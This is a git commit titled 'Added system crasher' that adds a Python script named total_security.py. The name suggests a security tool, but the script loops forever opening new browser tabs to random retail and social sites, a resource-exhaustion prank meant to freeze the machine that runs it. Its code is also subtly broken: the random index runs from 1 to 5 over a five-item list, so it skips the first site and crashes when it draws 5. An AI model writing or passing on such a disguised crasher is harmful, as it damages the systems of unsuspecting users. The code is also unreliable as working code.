88c2f66a4dff301338787ccb265fb410ee912dc3
GabrielDaKing <34449228+GabrielDaKing@users.noreply.github.com>
2019-04-01 00:04:53 +0530

    Added system crasher

---
+++ total_security.py
@@ -0,0 +1,15 @@
+from webbrowser import *
+from time import *
+from random import *
+
+def webpage():
+
+	while True:
+
+		a = randint(1, 5)
+		websites = ['www.amazon.co.in','www.google.com','www.facebook.com','www.twitter.com','www.flipkart.com']
+
+		open_new(websites[a])
+
+if __name__=="__main__":
+	webpage()
